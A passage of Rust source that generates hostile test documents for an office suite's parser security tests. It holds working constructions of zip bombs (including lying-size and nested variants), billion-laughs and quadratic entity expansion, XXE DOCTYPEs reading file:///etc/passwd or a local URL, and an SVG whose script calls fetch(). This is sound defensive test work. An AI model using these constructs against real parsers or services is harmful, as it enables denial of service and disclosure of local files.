//! Hostile sample files for the security tests (`crates/bo-engine/tests/hostile_files.rs`,
//! `tests/e2e/specs/hostile-files.spec.ts`, `bo-cli sample-hostile <dir>`).
//!
//! Every file is **built here from scratch** (or from a small self-generated corpus file
//! of this repository): no malware is downloaded and no payload is executable. "Embedded
//! executables" are a few bytes starting with `MZ` followed by plain text; "macros" are
//! the VBA project written by `bo_binary::vba_write` from source text; external targets
//! point at the addresses given in [`Config`] so a test can watch them (a local TCP
//! listener, a sentinel file) and prove that nothing is fetched or read.
//!
//! Each [`Case`] carries what the engines must do with it ([`Expect`]) and what a save
//! must keep (parts, strings).

use std::fmt::Write as _;
use std::io::{Cursor, Read, Write};

/// Result of the generator.
pub type Result<T> = std::result::Result<T, Box<dyn std::error::Error + Send + Sync>>;

/// The app whose engine opens the file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum App {
    /// BlueDoc (`Engine::open`): .docx/.docm/.doc/.html/.mht/.pdf.
    Doc,
    /// BlueSheet (`SheetEngine::open`).
    Sheet,
    /// BlueSlide (`Engine::open` of a deck).
    Slide,
}

/// What opening the file must give.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Expect {
    /// A clean error (limits, damaged package).
    Reject,
    /// The file opens; the hostile parts are inert data.
    Open,
    /// Either a clean error or an inert open.
    Either,
}

/// One hostile sample.
#[derive(Debug, Clone)]
pub struct Case {
    /// File name (the extension selects the format).
    pub name: String,
    /// Engine that opens it.
    pub app: App,
    /// Required outcome.
    pub expect: Expect,
    /// The threat, in one line (documentation, test messages).
    pub threat: &'static str,
    /// The file.
    pub bytes: Vec<u8>,
    /// The engine must report macros (kept, never run).
    pub macros: bool,
    /// The saved file still carries the macros. `false` for binary files: they are
    /// saved as .docx / .xlsx, which cannot hold a VBA project.
    pub macros_saved: bool,
    /// OOXML parts (absolute part names) a save must keep byte for byte.
    pub keep_parts: Vec<String>,
    /// Strings that must still be somewhere in the saved package (external targets,
    /// field instructions…): preserved as data.
    pub keep_text: Vec<String>,
}

/// Where the external references of the samples point.
#[derive(Debug, Clone)]
pub struct Config {
    /// Base `http://` URL (a test points it at a local listener that must stay silent).
    pub http: String,
    /// A `file://` URL (a test points it at a sentinel file whose content must never
    /// show up).
    pub file_url: String,
    /// A UNC path `\\host\share\…`.
    pub unc: String,
}

impl Default for Config {
    fn default() -> Self {
        Config {
            http: "http://127.0.0.1:9/hostile".into(),
            file_url: "file:///etc/passwd".into(),
            unc: r"\\127.0.0.1\share\hostile".into(),
        }
    }
}

/// Text placed inside every script body of the samples: it must never reach the
/// document text.
pub const SCRIPT_MARKER: &str = "BO-HOSTILE-SCRIPT";

/// Size of the deflated run of zeros of the zip bombs.
const BOMB_BYTES: usize = 24 << 20;

// ---------------------------------------------------------------------------------
// ZIP / OPC building blocks

/// Relationship namespace of ECMA-376 Part 1 (officeDocument relationships).
const R: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
const W_NS: &str = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
const S_NS: &str = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";
const A_NS: &str = "http://schemas.openxmlformats.org/drawingml/2006/main";
const PIC_NS: &str = "http://schemas.openxmlformats.org/drawingml/2006/picture";
const WP_NS: &str = "http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing";
const CT_DOCX: &str =
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml";
const CT_XLSX: &str = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml";
const CT_SHEET: &str = "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml";
const CT_PPTX: &str =
    "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml";
const CT_OLE: &str = "application/vnd.openxmlformats-officedocument.oleObject";

/// One relationship ([ECMA-376 Part 2] OPC `Relationship`; `TargetMode="External"`
/// makes the target a URI outside the package).
struct Rel {
    id: String,
    typ: String,
    target: String,
    external: bool,
}

/// An OPC package under construction ([ECMA-376 Part 2]: content types stream, parts,
/// relationship parts).
struct Pkg {
    parts: Vec<(String, Vec<u8>)>,
    defaults: Vec<(String, String)>,
    overrides: Vec<(String, String)>,
    /// `[Content_Types].xml` of a base package (new defaults/overrides are inserted).
    base_types: Option<String>,
    rels: Vec<(String, Vec<Rel>)>,
}

impl Pkg {
    fn new() -> Self {
        Pkg {
            parts: Vec::new(),
            defaults: vec![
                (
                    "rels".into(),
                    "application/vnd.openxmlformats-package.relationships+xml".into(),
                ),
                ("xml".into(), "application/xml".into()),
            ],
            overrides: Vec::new(),
            base_types: None,
            rels: Vec::new(),
        }
    }

    /// Add or replace a part (`name` without the leading `/`).
    fn put(&mut self, name: &str, ct: Option<&str>, data: impl Into<Vec<u8>>) {
        let data = data.into();
        if let Some(p) = self.parts.iter_mut().find(|(n, _)| n == name) {
            p.1 = data;
        } else {
            self.parts.push((name.to_owned(), data));
        }
        if let Some(ct) = ct {
            self.overrides.retain(|(n, _)| n != name);
            self.overrides.push((name.to_owned(), ct.to_owned()));
        }
    }

    fn default_ct(&mut self, ext: &str, ct: &str) {
        if !self.defaults.iter().any(|(e, _)| e == ext) {
            self.defaults.push((ext.to_owned(), ct.to_owned()));
        }
    }

    /// Add a relationship to the relationship part `rels_part` (e.g.
    /// `word/_rels/document.xml.rels`).
    fn rel(&mut self, rels_part: &str, id: &str, typ: &str, target: &str, external: bool) {
        let r = Rel {
            id: id.to_owned(),
            typ: if typ.starts_with("http") {
                typ.to_owned()
            } else {
                format!("{R}/{typ}")
            },
            target: target.to_owned(),
            external,
        };
        if let Some((_, v)) = self.rels.iter_mut().find(|(n, _)| n == rels_part) {
            v.push(r);
        } else {
            self.rels.push((rels_part.to_owned(), vec![r]));
        }
    }

    fn content_types(&self) -> String {
        let mut extra = String::new();
        for (e, ct) in &self.defaults {
            let _ = write!(extra, r#"<Default Extension="{e}" ContentType="{ct}"/>"#);
        }
        for (n, ct) in &self.overrides {
            let _ = write!(extra, r#"<Override PartName="/{n}" ContentType="{ct}"/>"#);
        }
        match &self.base_types {
            Some(base) => base.replacen("</Types>", &format!("{extra}</Types>"), 1),
            None => format!(
                r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">{extra}</Types>"#
            ),
        }
    }

    fn entries(&self) -> Vec<(String, Vec<u8>)> {
        let mut out = vec![(
            "[Content_Types].xml".to_owned(),
            self.content_types().into_bytes(),
        )];
        for (part, rels) in &self.rels {
            let mut x = String::from(
                r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">"#,
            );
            for r in rels {
                let _ = write!(
                    x,
                    r#"<Relationship Id="{}" Type="{}" Target="{}"{}/>"#,
                    r.id,
                    r.typ,
                    esc(&r.target),
                    if r.external {
                        r#" TargetMode="External""#
                    } else {
                        ""
                    }
                );
            }
            x.push_str("</Relationships>");
            out.push((part.clone(), x.into_bytes()));
        }
        out.extend(self.parts.iter().cloned());
        out
    }

    fn build(&self) -> Result<Vec<u8>> {
        zip(&self.entries())
    }
}

/// XML-escape text and attribute values.
fn esc(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

/// A deflated ZIP archive ([PKWARE APPNOTE] local headers + central directory).
fn zip(entries: &[(String, Vec<u8>)]) -> Result<Vec<u8>> {
    let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let opts = zip::write::SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated)
        .system(zip::System::Dos);
    for (name, data) in entries {
        w.start_file(name.as_str(), opts)?;
        w.write_all(data)?;
    }
    Ok(w.finish()?.into_inner())
}

/// `entries` plus one entry holding `zeros` zero bytes, deflated at the highest level
/// (ratio ~1000:1).
fn zip_with_bomb(entries: &[(String, Vec<u8>)], bomb: &str, zeros: usize) -> Result<Vec<u8>> {
    let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let opts = zip::write::SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated)
        .system(zip::System::Dos);
    for (name, data) in entries {
        w.start_file(name.as_str(), opts)?;
        w.write_all(data)?;
    }
    w.start_file(bomb, opts.compression_level(Some(9)))?;
    let chunk = vec![0u8; 1 << 20];
    let mut left = zeros;
    while left > 0 {
        let n = left.min(chunk.len());
        w.write_all(&chunk[..n])?;
        left -= n;
    }
    Ok(w.finish()?.into_inner())
}

fn u16_at(b: &[u8], at: usize) -> usize {
    b.get(at..at + 2)
        .map_or(0, |s| usize::from(u16::from_le_bytes([s[0], s[1]])))
}

/// Overwrite the uncompressed size declared for entry `name` in its local file header
/// and its central directory header ([PKWARE APPNOTE] §4.3.7 / §4.3.12): the size a
/// reader sees before inflating no longer matches the data.
fn patch_declared_size(zip: &mut [u8], name: &str, size: u32) {
    let name = name.as_bytes();
    let mut i = 0;
    while i + 46 <= zip.len() {
        if zip[i..].starts_with(b"PK\x03\x04") {
            let n = u16_at(zip, i + 26);
            if zip.get(i + 30..i + 30 + n) == Some(name) {
                zip[i + 22..i + 26].copy_from_slice(&size.to_le_bytes());
            }
        } else if zip[i..].starts_with(b"PK\x01\x02") {
            let n = u16_at(zip, i + 28);
            if zip.get(i + 46..i + 46 + n) == Some(name) {
                zip[i + 24..i + 28].copy_from_slice(&size.to_le_bytes());
            }
        }
        i += 1;
    }
}

// ---------------------------------------------------------------------------------
// Images

fn crc32(data: &[u8]) -> u32 {
    let mut c = 0xFFFF_FFFFu32;
    for &b in data {
        c ^= u32::from(b);
        for _ in 0..8 {
            c = if c & 1 == 1 {
                0xEDB8_8320 ^ (c >> 1)
            } else {
                c >> 1
            };
        }
    }
    !c
}

fn adler32(data: &[u8]) -> u32 {
    let (mut a, mut b) = (1u32, 0u32);
    for &x in data {
        a = (a + u32::from(x)) % 65521;
        b = (b + a) % 65521;
    }
    (b << 16) | a
}

/// A zlib stream ([RFC 1950]) holding `data` in one stored deflate block ([RFC 1951]).
fn zlib_stored(data: &[u8]) -> Vec<u8> {
    let len = u16::try_from(data.len()).unwrap_or(u16::MAX);
    let mut z = vec![0x78, 0x01, 0x01];
    z.extend_from_slice(&len.to_le_bytes());
    z.extend_from_slice(&(!len).to_le_bytes());
    z.extend_from_slice(&data[..usize::from(len)]);
    z.extend_from_slice(&adler32(&data[..usize::from(len)]).to_be_bytes());
    z
}

fn png_chunk(out: &mut Vec<u8>, kind: [u8; 4], data: &[u8]) {
    out.extend_from_slice(&u32::try_from(data.len()).unwrap_or(0).to_be_bytes());
    let mut c = kind.to_vec();
    c.extend_from_slice(data);
    out.extend_from_slice(&c);
    out.extend_from_slice(&crc32(&c).to_be_bytes());
}

/// A PNG ([ISO/IEC 15948] signature, `IHDR`, `IDAT`, `IEND`) declaring `w`×`h` RGB
/// pixels; the image data holds only the first scanline's filter byte and pixel.
fn png(w: u32, h: u32) -> Vec<u8> {
    let mut out = b"\x89PNG\r\n\x1a\n".to_vec();
    let mut ihdr = Vec::new();
    ihdr.extend_from_slice(&w.to_be_bytes());
    ihdr.extend_from_slice(&h.to_be_bytes());
    ihdr.extend_from_slice(&[8, 2, 0, 0, 0]);
    png_chunk(&mut out, *b"IHDR", &ihdr);
    png_chunk(&mut out, *b"IDAT", &zlib_stored(&[0, 0x20, 0x60, 0xC0]));
    png_chunk(&mut out, *b"IEND", &[]);
    out
}

/// A baseline JPEG header ([ITU-T T.81] SOI, DQT, SOF0, EOI) declaring `w`×`h`
/// pixels and holding no scan.
fn jpeg(w: u16, h: u16) -> Vec<u8> {
    let mut out = vec![0xFF, 0xD8];
    out.extend_from_slice(&[0xFF, 0xDB, 0x00, 0x43, 0x00]);
    out.extend_from_slice(&[1u8; 64]);
    out.extend_from_slice(&[0xFF, 0xC0, 0x00, 0x0B, 0x08]);
    out.extend_from_slice(&h.to_be_bytes());
    out.extend_from_slice(&w.to_be_bytes());
    out.extend_from_slice(&[0x01, 0x01, 0x11, 0x00]);
    out.extend_from_slice(&[0xFF, 0xD9]);
    out
}

/// A GIF89a logical screen of 65535×65535 with no image block.
fn gif_huge() -> Vec<u8> {
    let mut out = b"GIF89a".to_vec();
    out.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00]);
    out.push(0x3B);
    out
}

/// A BMP (`BITMAPINFOHEADER`) declaring 1 000 000 × 1 000 000 pixels of 24 bits.
fn bmp_huge() -> Vec<u8> {
    let mut out = b"BM".to_vec();
    out.extend_from_slice(&66u32.to_le_bytes());
    out.extend_from_slice(&[0, 0, 0, 0]);
    out.extend_from_slice(&54u32.to_le_bytes());
    out.extend_from_slice(&40u32.to_le_bytes());
    out.extend_from_slice(&1_000_000i32.to_le_bytes());
    out.extend_from_slice(&1_000_000i32.to_le_bytes());
    out.extend_from_slice(&1u16.to_le_bytes());
    out.extend_from_slice(&24u16.to_le_bytes());
    out.extend_from_slice(&[0u8; 24]);
    out.extend_from_slice(&[0u8; 12]);
    out
}

/// `n` pseudo-random ASCII letters (xorshift, reproducible) with no break opportunity:
/// they do not compress below the ZIP ratio limit, so the readers see the full string.
fn noise(n: usize, seed: u64) -> String {
    let mut x = seed.wrapping_mul(0x9E37_79B9_7F4A_7C15) | 1;
    (0..n)
        .map(|_| {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            char::from(b'a' + u8::try_from(x % 26).unwrap_or(0))
        })
        .collect()
}

// ---------------------------------------------------------------------------------
// Inert payloads

/// A compound file ([MS-CFB]) holding an OLE 1.0 "Package" object
/// ([MS-OLEDS] `\x01Ole10Native` stream: size, label, source path, temp path, data)
/// whose data looks like a Windows program: `MZ` and plain text. Not runnable.
fn ole_package_with_exe() -> Result<Vec<u8>> {
    let payload = b"MZ\x90\x00 BlueOffice hostile-file test payload: not a program.";
    let mut native = Vec::new();
    native.extend_from_slice(&2u16.to_le_bytes());
    native.extend_from_slice(b"invoice.exe\0");
    native.extend_from_slice(b"C:\\Users\\Public\\invoice.exe\0");
    native.extend_from_slice(&[0, 0, 3, 0]);
    let tmp = b"C:\\Users\\Public\\AppData\\Local\\Temp\\invoice.exe\0";
    native.extend_from_slice(&u32::try_from(tmp.len()).unwrap_or(0).to_le_bytes());
    native.extend_from_slice(tmp);
    native.extend_from_slice(&u32::try_from(payload.len()).unwrap_or(0).to_le_bytes());
    native.extend_from_slice(payload);
    let mut stream = u32::try_from(native.len())
        .unwrap_or(0)
        .to_le_bytes()
        .to_vec();
    stream.extend_from_slice(&native);
    let mut cf = cfb::CompoundFile::create(Cursor::new(Vec::new()))?;
    cf.create_stream("/\u{1}Ole10Native")?.write_all(&stream)?;
    cf.flush()?;
    Ok(cf.into_inner().into_inner())
}

/// `host` (a binary `.doc` / `.xls`) with the VBA project `project` copied under the
/// storage `root` (`/Macros` for [MS-DOC], `/_VBA_PROJECT_CUR` for [MS-XLS]).
fn graft_vba(host: &[u8], root: &str, project: &[u8]) -> Result<Vec<u8>> {
    let mut src = cfb::CompoundFile::open(Cursor::new(project))?;
    let entries: Vec<(String, bool)> = src
        .walk()
        .filter(|e| !e.is_root())
        .map(|e| (e.path().to_string_lossy().replace('\\', "/"), e.is_stream()))
        .collect();
    let mut dst = cfb::CompoundFile::open(Cursor::new(host.to_vec()))?;
    dst.create_storage(root)?;
    for (path, is_stream) in entries {
        let target = format!("{root}{path}");
        if is_stream {
            let mut data = Vec::new();
            src.open_stream(&path)?.read_to_end(&mut data)?;
            dst.create_stream(&target)?.write_all(&data)?;
        } else {
            dst.create_storage(&target)?;
        }
    }
    dst.flush()?;
    Ok(dst.into_inner().into_inner())
}

/// An SVG image with a script, event handlers and external references (SVG 1.1:
/// `script`, `image`/`use` `href`, `foreignObject`).
fn svg_hostile(cfg: &Config) -> String {
    let (http, file) = (esc(&cfg.http), esc(&cfg.file_url));
    format!(
        r##"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY ext SYSTEM "{file}">]><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" onload="alert('{SCRIPT_MARKER}')"><script type="text/javascript">/* {SCRIPT_MARKER} */ fetch("{http}/svg-script");</script><image href="{http}/svg-image.png" width="10" height="10"/><image xlink:href="{file}" x="10" width="10" height="10"/><use href="{http}/sprite.svg#a"/><foreignObject width="10" height="10"><iframe xmlns="http://www.w3.org/1999/xhtml" src="{file}"/></foreignObject><text x="5" y="90">&ext;</text><rect x="20" y="20" width="50" height="50" fill="#3060C0"/></svg>"##
    )
}

// ---------------------------------------------------------------------------------
// BlueDoc samples

/// WordprocessingML paragraph with one run of text.
fn wp(text: &str) -> String {
    format!(
        r#"<w:p><w:r><w:t xml:space="preserve">{}</w:t></w:r></w:p>"#,
        esc(text)
    )
}

/// A complex field ([ECMA-376 Part 1] §17.16 fields: `fldChar` begin / `instrText` /
/// separate / cached result / end).
fn field(instr: &str, cached: &str) -> String {
    format!(
        r#"<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> {} </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>{}</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>"#,
        esc(instr),
        esc(cached)
    )
}

/// A simple field (`w:fldSimple`).
fn simple_field(instr: &str, cached: &str) -> String {
    format!(
        r#"<w:p><w:fldSimple w:instr=" {} "><w:r><w:t>{}</w:t></w:r></w:fldSimple></w:p>"#,
        esc(instr),
        esc(cached)
    )
}

/// Inline picture ([ECMA-376 Part 1] DrawingML `wp:inline` / `pic:pic`); `blip` is
/// the `a:blip` element.
fn inline_picture(id: u32, blip: &str) -> String {
    format!(
        r#"<w:p><w:r><w:drawing><wp:inline><wp:extent cx="952500" cy="952500"/><wp:docPr id="{id}" name="Picture {id}"/><a:graphic><a:graphicData uri="{PIC_NS}"><pic:pic><pic:nvPicPr><pic:cNvPr id="{id}" name="Picture {id}"/><pic:cNvPicPr/></pic:nvPicPr><pic:blipFill>{blip}<a:stretch><a:fillRect/></a:stretch></pic:blipFill><pic:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="952500" cy="952500"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>"#
    )
}

fn document_xml(doctype: &str, body: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>{doctype}<w:document xmlns:w="{W_NS}" xmlns:r="{R}" xmlns:wp="{WP_NS}" xmlns:a="{A_NS}" xmlns:pic="{PIC_NS}" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><w:body>{body}<w:sectPr><w:pgSz w:w="11906" w:h="16838"/><w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1134" w:header="709" w:footer="709" w:gutter="0"/></w:sectPr></w:body></w:document>"#
    )
}

const DOC_RELS: &str = "word/_rels/document.xml.rels";

/// A package with `word/document.xml` (`doctype` before the root, `body` inside
/// `w:body`).
fn docx_pkg(doctype: &str, body: &str) -> Pkg {
    let mut p = Pkg::new();
    p.put(
        "word/document.xml",
        Some(CT_DOCX),
        document_xml(doctype, body),
    );
    p.rel(
        "_rels/.rels",
        "rId1",
        "officeDocument",
        "word/document.xml",
        false,
    );
    p
}

fn docx(body: &str) -> Result<Vec<u8>> {
    docx_pkg("", body).build()
}

// ---------------------------------------------------------------------------------
// BlueSheet samples

const XLSX_STYLES: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><fonts count="1"><font><sz val="11"/><name val="Calibri"/></font></fonts><fills count="2"><fill><patternFill patternType="none"/></fill><fill><patternFill patternType="gray125"/></fill></fills><borders count="1"><border><left/><right/><top/><bottom/><diagonal/></border></borders><cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs><cellXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/></cellXfs></styleSheet>"#;

/// A workbook with one sheet ([ECMA-376 Part 1] §18: `workbook`, `worksheet`,
/// `sheetData`). `rows` are `row` elements, `sheet_tail` follows `sheetData`,
/// `book_tail` follows `sheets`; `doctype` precedes the worksheet root.
fn xlsx_pkg(doctype: &str, rows: &str, sheet_tail: &str, book_tail: &str) -> Pkg {
    let mut p = Pkg::new();
    p.put(
        "xl/workbook.xml",
        Some(CT_XLSX),
        format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><workbook xmlns="{S_NS}" xmlns:r="{R}"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>{book_tail}</workbook>"#
        ),
    );
    p.put(
        "xl/worksheets/sheet1.xml",
        Some(CT_SHEET),
        format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>{doctype}<worksheet xmlns="{S_NS}" xmlns:r="{R}"><sheetData>{rows}</sheetData>{sheet_tail}</worksheet>"#
        ),
    );
    p.put(
        "xl/styles.xml",
        Some("application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"),
        XLSX_STYLES,
    );
    p.rel(
        "_rels/.rels",
        "rId1",
        "officeDocument",
        "xl/workbook.xml",
        false,
    );
    p.rel(
        "xl/_rels/workbook.xml.rels",
        "rId1",
        "worksheet",
        "worksheets/sheet1.xml",
        false,
    );
    p.rel(
        "xl/_rels/workbook.xml.rels",
        "rId2",
        "styles",
        "styles.xml",
        false,
    );
    p
}

/// An inline-string cell.
fn text_cell(r: &str, text: &str) -> String {
    format!(
        r#"<c r="{r}" t="inlineStr"><is><t xml:space="preserve">{}</t></is></c>"#,
        esc(text)
    )
}

const SHEET_RELS: &str = "xl/worksheets/_rels/sheet1.xml.rels";

/// Adds a drawing with one picture of `media` (DrawingML spreadsheet drawing,
/// `xdr:twoCellAnchor` / `xdr:pic`) to the sheet; returns the `drawing` element.
fn xlsx_picture(p: &mut Pkg, media: &str, link: bool) -> String {
    let blip = if link {
        r#"<a:blip r:link="rIdImg"/>"#
    } else {
        r#"<a:blip r:embed="rIdImg"/>"#
    };
    p.put(
        "xl/drawings/drawing1.xml",
        Some("application/vnd.openxmlformats-officedocument.drawing+xml"),
        format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:a="{A_NS}" xmlns:r="{R}"><xdr:twoCellAnchor><xdr:from><xdr:col>1</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>1</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from><xdr:to><xdr:col>4</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>8</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to><xdr:pic><xdr:nvPicPr><xdr:cNvPr id="2" name="Picture 1"/><xdr:cNvPicPr/></xdr:nvPicPr><xdr:blipFill>{blip}<a:stretch><a:fillRect/></a:stretch></xdr:blipFill><xdr:spPr><a:prstGeom prst="rect"><a:avLst/></a:prstGeom></xdr:spPr></xdr:pic><xdr:clientData/></xdr:twoCellAnchor></xdr:wsDr>"#
        ),
    );
    p.rel(
        SHEET_RELS,
        "rIdD",
        "drawing",
        "../drawings/drawing1.xml",
        false,
    );
    p.rel(
        "xl/drawings/_rels/drawing1.xml.rels",
        "rIdImg",
        "image",
        media,
        link,
    );
    r#"<drawing r:id="rIdD"/>"#.to_owned()
}

// ---------------------------------------------------------------------------------
// BlueSlide samples

/// Base deck: a self-generated corpus deck of this repository (theme, master, layouts).
const BASE_PPTX: &[u8] = include_bytes!("../../../tests/corpus/slide/slide-tables-basic.pptx");
/// Base binary files of this repository's corpus ([MS-DOC], [MS-XLS]).
const BASE_DOC: &[u8] = include_bytes!("../../../tests/corpus/doc/binary-doc-01-sample.doc");
const BASE_XLS: &[u8] = include_bytes!("../../../tests/corpus/sheet/binary-xls-01-features.xls");

const SLIDE_RELS: &str = "ppt/slides/_rels/slide1.xml.rels";

/// The base deck with slide 1 replaced: `doctype` before the root, `shapes` inside
/// `p:spTree` ([ECMA-376 Part 1] §19.3 PresentationML `p:sld`).
fn pptx_pkg(doctype: &str, shapes: &str) -> Result<Pkg> {
    let mut z = zip::ZipArchive::new(Cursor::new(BASE_PPTX))?;
    let mut p = Pkg::new();
    p.defaults.clear();
    for i in 0..z.len() {
        let mut f = z.by_index(i)?;
        let name = f.name()?.into_owned();
        let mut data = Vec::new();
        f.read_to_end(&mut data)?;
        match name.as_str() {
            "[Content_Types].xml" => p.base_types = Some(String::from_utf8(data)?),
            SLIDE_RELS => {}
            _ => p.parts.push((name, data)),
        }
    }
    p.rel(
        SLIDE_RELS,
        "rId1",
        "slideLayout",
        "../slideLayouts/slideLayout3.xml",
        false,
    );
    p.put(
        "ppt/slides/slide1.xml",
        None,
        format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>{doctype}<p:sld xmlns:a="{A_NS}" xmlns:r="{R}" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/>{shapes}</p:spTree></p:cSld></p:sld>"#
        ),
    );
    Ok(p)
}

/// A text box; `run_extra` goes inside `a:rPr` (e.g. `a:hlinkClick`).
fn text_box(id: u32, text: &str, run_extra: &str) -> String {
    format!(
        r#"<p:sp><p:nvSpPr><p:cNvPr id="{id}" name="TextBox {id}"/><p:cNvSpPr txBox="1"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x="457200" y="{}"/><a:ext cx="8000000" cy="500000"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom></p:spPr><p:txBody><a:bodyPr wrap="square"/><a:lstStyle/><a:p><a:r><a:rPr lang="vi-VN" sz="2000">{run_extra}</a:rPr><a:t>{}</a:t></a:r></a:p></p:txBody></p:sp>"#,
        200_000 + 600_000 * id,
        esc(text)
    )
}

/// A picture shape whose `a:blip` is `blip`.
fn slide_picture(id: u32, blip: &str) -> String {
    format!(
        r#"<p:pic><p:nvPicPr><p:cNvPr id="{id}" name="Picture {id}"/><p:cNvPicPr/><p:nvPr/></p:nvPicPr><p:blipFill>{blip}<a:stretch><a:fillRect/></a:stretch></p:blipFill><p:spPr><a:xfrm><a:off x="{}" y="3000000"/><a:ext cx="914400" cy="914400"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom></p:spPr></p:pic>"#,
        1_000_000 * id
    )
}

// ---------------------------------------------------------------------------------
// Entity expansion

/// "Billion laughs" ([XML 1.0] §4.2 internal entities, 10 levels × 10 references).
fn billion_laughs(root: &str) -> String {
    let mut d = format!(r#"<!DOCTYPE {root} [<!ENTITY lol0 "lol">"#);
    for i in 1..10 {
        let refs = format!("&lol{};", i - 1).repeat(10);
        let _ = write!(d, r#"<!ENTITY lol{i} "{refs}">"#);
    }
    d.push_str("]>");
    d
}

/// Quadratic blow-up: one 64 KiB internal entity, referenced `n` times.
fn quadratic(root: &str) -> String {
    format!(
        r#"<!DOCTYPE {root} [<!ENTITY big "{}">]>"#,
        "A".repeat(64 << 10)
    )
}

/// External entities ([XML 1.0] §4.2.2) and an external DTD subset over `file:` and
/// `http:` (XXE), plus a parameter entity.
fn xxe(root: &str, cfg: &Config) -> String {
    format!(
        r#"<!DOCTYPE {root} SYSTEM "{http}/external.dtd" [<!ENTITY xfile SYSTEM "{file}"><!ENTITY xhttp SYSTEM "{http}/xxe"><!ENTITY % pe SYSTEM "{http}/pe.dtd"> %pe;]>"#,
        http = esc(&cfg.http),
        file = esc(&cfg.file_url)
    )
}

// ---------------------------------------------------------------------------------
// The cases

#[allow(clippy::too_many_lines)]
fn doc_cases(cfg: &Config, out: &mut Vec<Case>) -> Result<()> {
    let plain = docx_pkg("", &wp("Tệp thử nghiệm độc hại"));

    // Zip bombs.
    let entries = plain.entries();
    out.push(Case {
        name: "zip-bomb-ratio.docx".into(),
        app: App::Doc,
        expect: Expect::Reject,
        threat: "ZIP part of 24 MiB of zeros deflated ~1000:1",
        bytes: zip_with_bomb(&entries, "word/media/bomb.bin", BOMB_BYTES)?,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    let mut lying = zip_with_bomb(&entries, "word/media/bomb.bin", BOMB_BYTES)?;
    patch_declared_size(&mut lying, "word/media/bomb.bin", 1000);
    out.push(Case {
        name: "zip-bomb-lying-size.docx".into(),
        app: App::Doc,
        expect: Expect::Reject,
        threat: "ZIP bomb whose headers declare 1000 bytes (size checks before inflating pass)",
        bytes: lying,
        macros: false,
        macros_saved: false,
        keep_parts: vec![],
        keep_text: vec![],
    });
    // Nested: a package embedded in a package embedded in the document, the innermost
    // holding a bomb.
    let inner = zip_with_bomb(
        &xlsx_pkg("", "", "", "").entries(),
        "xl/media/bomb.bin",
        8 << 20,
    )?;
    let mut middle = docx_pkg("", &wp("Gói lồng"));
    middle.default_ct(
        "xlsx",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    );
    middle.put("word/embeddings/Inner.xlsx", None, inner);
    middle.rel(
        DOC_RELS,
        "rIdPkg",
        "package",
        "embeddings/Inner.xlsx",
        false,
    );
    let mut outer = docx_pkg("", &wp("Gói lồng ngoài"));
    outer.default_ct(
        "docx",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    );
    outer.put("word/embeddings/Middle.docx", None, middle.build()?);
    outer.rel(
